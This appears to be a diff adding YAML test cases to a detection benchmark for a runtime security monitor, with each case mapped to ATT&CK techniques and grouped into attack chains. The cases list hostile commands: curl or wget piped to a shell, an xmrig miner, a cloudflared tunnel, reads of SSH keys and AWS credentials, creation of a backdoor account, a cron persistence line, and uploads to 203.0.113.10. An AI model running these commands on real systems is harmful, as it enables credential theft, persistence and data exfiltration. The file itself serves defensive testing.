+    name: container and kube enum
+    cmd: 'docker ps -a && kubectl get nodes'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: docker
+    expected_rules:
+      - exec-recon-kubectl
+    intent_tags: []
+    expect: detectable
+    severity_hint: low
+
+  # kill-chain groups (shared intent buckets; uid fixed per chain) --------
+  # chain-A replicates the R2 campaign sequence: download+execute steps
+  # accumulate 5.0 then 6.5 -> cross 11.5 at CA2 with intent/download_and_execute.
+  - id: CA1
+    tactic: TA0002
+    technique: T1059.004
+    name: chain-A curl pipe bash step 1
+    cmd: 'curl -s --connect-timeout 2 http://203.0.113.10/a.sh | bash'
+    creates_process: true
+    mode: real
+    bin: curl
+    expected_rules:
+      - exec-curl-pipe-shell
+    intent_tags:
+      - download_and_execute
+    bucket: chain-A
+    expect: detectable
+    severity_hint: high
+
+  - id: CA2
+    tactic: TA0002
+    technique: T1059.004
+    name: chain-A wget pipe sh step 2 crossing
+    cmd: 'wget -q -O - http://203.0.113.10/a2.sh | sh'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: wget
+    expected_rules:
+      - exec-curl-pipe-shell
+      - intent/download_and_execute
+    intent_tags:
+      - download_and_execute
+      - remote_download
+    bucket: chain-A
+    expect: detectable
+    severity_hint: high
+
+  - id: CA3
+    tactic: TA0040
+    technique: T1496
+    name: chain-A miner drop step 3
+    cmd: 'xmrig --donate-level 1 --url stratum+tcp://pool.minexmr.com:3333'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: xmrig
+    expected_rules:
+      - exec-miner-config
+    intent_tags:
+      - mining_indicator
+    bucket: chain-A
+    expect: detectable
+    severity_hint: critical
+
+  - id: CA4
+    tactic: TA0011
+    technique: T1071.001
+    name: chain-A tunnel cover step 4
+    cmd: 'cloudflared access tcp --hostname trycloudflare.com'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: cloudflared
+    expected_rules:
+      - exec-tunnel-cloudflare
+    intent_tags:
+      - tunnel_setup
+    bucket: chain-A
+    expect: detectable
+    severity_hint: high
+
+  # chain-B insider path: recon 2.0 + cred 4.0 + useradd 3.5
+  # -> cross 9.5 at CB3 with intent/user_creation; the cron step 4 then
+  # only adds persistence_cron 4.5 to an already-alerted bucket.
+  - id: CB1
+    tactic: TA0043
+    technique: T1046
+    name: chain-B recon scan step 1
+    cmd: 'nmap -sT -p 22,80 127.0.0.1'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: nmap
+    expected_rules:
+      - exec-recon-nmap
+    intent_tags:
+      - recon_port_scan
+    bucket: chain-B
+    expect: detectable
+    severity_hint: medium
+
+  - id: CB2
+    tactic: TA0006
+    technique: T1552.004
+    name: chain-B key theft step 2
+    cmd: 'cat /root/.ssh/id_rsa'
+    creates_process: true
+    mode: real
+    bin: cat
+    expected_rules:
+      - exec-cred-material-read
+    intent_tags:
+      - cred_material_read
+    bucket: chain-B
+    expect: detectable
+    severity_hint: high
+
+  - id: CB3
+    tactic: TA0003
+    technique: T1136.001
+    name: chain-B backdoor account step 3 crossing
+    cmd: 'useradd -m -s /bin/bash benchsvc98'
+    creates_process: true
+    mode: real
+    bin: useradd
+    expected_rules:
+      - exec-user-creation
+      - intent/user_creation
+    intent_tags:
+      - user_creation
+    bucket: chain-B
+    expect: detectable
+    severity_hint: high
+
+  - id: CB4
+    tactic: TA0003
+    technique: T1053.003
+    name: chain-B cron persist step 4 after crossing
+    cmd: 'echo "*/5 * * * * root /tmp/.bench-beacon" >> /etc/crontab'
+    creates_process: false
+    mode: sim-builtin
+    bin: ''
+    expected_rules:
+      - exec-persistence-cron-write
+    intent_tags:
+      - persistence_cron
+    bucket: chain-B
+    expect: detectable
+    severity_hint: critical
+
+  # chain-C exfil path: cred 4.0 + archive (unscored) + upload 4.5
+  # -> cross 8.5 at CC3 with intent/data_upload.
+  - id: CC1
+    tactic: TA0006
+    technique: T1552.001
+    name: chain-C aws cred read step 1
+    cmd: 'cat /root/.aws/credentials'
+    creates_process: true
+    mode: real
+    bin: cat
+    expected_rules:
+      - exec-cred-secret-pattern
+      - exec-cred-material-read
+    intent_tags:
+      - cred_material_read
+    bucket: chain-C
+    expect: detectable
+    severity_hint: high
+
+  - id: CC2
+    tactic: TA0009
+    technique: T1560.001
+    name: chain-C archive step 2
+    cmd: 'tar czf /tmp/bench-exfil.tar.gz /etc/hostname'
+    creates_process: true
+    mode: real
+    bin: tar
+    expected_rules: []
+    intent_tags:
+      - data_archive
+    bucket: chain-C
+    expect: gap
+    severity_hint: medium
+
+  - id: CC3
+    tactic: TA0010
+    technique: T1041
+    name: chain-C upload exfil step 3 crossing
+    cmd: 'curl --connect-timeout 2 -T /tmp/bench-exfil.tar.gz http://203.0.113.10/up'
+    creates_process: true
+    mode: real
+    bin: curl
+    expected_rules:
+      - intent/data_upload
+    intent_tags:
+      - data_upload
+      - remote_download
+    bucket: chain-C
+    expect: detectable
+    severity_hint: high
+
+  - id: CC4
+    tactic: TA0010
+    technique: T1048
+    name: chain-C scp exfil step 4
+    cmd: 'scp -o ConnectTimeout=2 /tmp/bench-exfil.tar.gz benchuser@203.0.113.10:/tmp/'
+    creates_process: false
+    mode: sim-missing-bin
+    bin: scp
+    expected_rules:
+      - exec-exfil-archive-remote
+    intent_tags:
+      - data_upload
+    bucket: chain-C
+    expect: detectable
+    severity_hint: high
